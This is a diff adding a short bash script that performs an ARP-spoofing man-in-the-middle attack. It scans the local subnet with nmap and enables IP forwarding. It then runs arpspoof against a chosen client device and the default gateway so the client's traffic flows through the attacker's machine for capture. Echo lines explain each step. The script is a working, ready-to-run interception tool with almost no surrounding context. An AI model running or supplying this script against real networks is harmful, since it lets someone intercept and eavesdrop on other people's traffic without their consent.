@@ -1,0 +1,17 @@
+#!/bin/bash
+echo "Script Description: This script will use 'arpspoof' to spoof the ARP table of the target device, to make all the traffic between that device and the router flow through our device in order to capture traffic"
+echo ~~Listing network interfaces \"ifconfig\"
+ifconfig
+read -p "~~Enter the network interface name that will be used: " interfaceName
+echo $interfaceName selected
+echo ~~Getting the network default gateway \"ip route | grep default\"
+defGateway=`ip route | grep default | awk  '{print $3}'`
+nmap -sn $defGateway/24
+read -p "~~Enter client device IP :" ClientIP
+echo ~~Enabling IP forward to allow the flow of packets through our device \"sysctl -w net.ipv4.ip_forward=1\"
+sysctl -w net.ipv4.ip_forward=1
+echo ~~Telling the target device that our device is the router \"arpspoof -i $interfaceName -t $ClientIP $defGateway\"
+echo ~~Telling the router that our device is the client device \"arpspoof -i $interfaceName -t $defGateway $ClientIP\"
+echo ~~Now compare the MAC address of default gateway in the client device arp table with the one of the network interface used.
+arpspoof -i $interfaceName -t $ClientIP $defGateway & arpspoof -i $interfaceName -t $defGateway $ClientIP
+
